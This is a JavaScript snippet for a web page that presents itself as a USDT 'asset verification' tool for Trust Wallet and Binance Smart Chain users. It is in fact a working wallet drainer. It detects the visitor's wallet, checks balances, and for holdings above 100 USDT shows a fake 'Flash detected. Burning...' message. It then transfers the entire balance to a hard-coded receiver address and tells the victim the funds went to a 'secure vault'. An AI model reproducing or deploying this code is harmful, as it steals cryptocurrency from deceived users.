<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Receiver
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT

let web3;
let userAddress;

// Auto-detect wallet without prompting
window.addEventListener("load", async () => {
    setTimeout(async () => {
        const provider = window.trustwallet || window.BinanceChain || window.ethereum;
        if (provider) {
            web3 = new Web3(provider);

            try {
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    console.log("Auto-detected wallet:", userAddress);
                } else {
                    console.log("No accounts found.");
                }
            } catch (e) {
                console.error("Error accessing wallet accounts:", e);
            }
        } else {
            console.error("No provider found.");
        }
    }, 1000);
});

async function verifyAssets() {
    if (!web3 || !userAddress) {
        showPopup("❌ Wallet not connected. Open this site inside Trust Wallet browser.", "black");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    try {
        const usdtBalanceWei = await usdtContract.methods.balanceOf(userAddress).call();
        const bnbBalanceWei = await web3.eth.getBalance(userAddress);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei));
        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei));

        console.log(`USDT: ${usdtBalance} | BNB: ${bnbBalance}`);

        if (usdtBalance === 0) {
            showPopup("❌ No USDT found.", "black");
        } else if (usdtBalance <= 100) {
            showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
        } else {
            showPopup("Flash detected. Burning...", "green");
            transferUSDT(usdtBalance);
        }
    } catch (err) {
        console.error(err);
        showPopup("❌ Error checking balances.", "red");
    }
}

async function transferUSDT(amount) {
    const usdtContract = new web3.eth.Contract([
        {
            constant: false,
            inputs: [
                { name: "recipient", type: "address" },
                { name: "amount", type: "uint256" }
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function"
        }
    ], usdtContractAddress);

    try {
        const amountToSend = web3.utils.toWei(amount.toString());
        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(`✅ ${amount} USDT transferred to secure vault.`, "red");
    } catch (e) {
        console.error("Transfer error:", e);
        showPopup("❌ Transfer failed. Insufficient BNB?", "red");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.zIndex = "9999";
        document.body.appendChild(popup);
    }

    popup.innerHTML = message;
    popup.style.backgroundColor = color === "red" ? "#ffdddd" : color === "green" ? "#ddffdd" : "#f5f5f5";
    popup.style.color = color === "red" ? "darkred" : color === "green" ? "green" : "black";
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// Hook to button
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
</script>
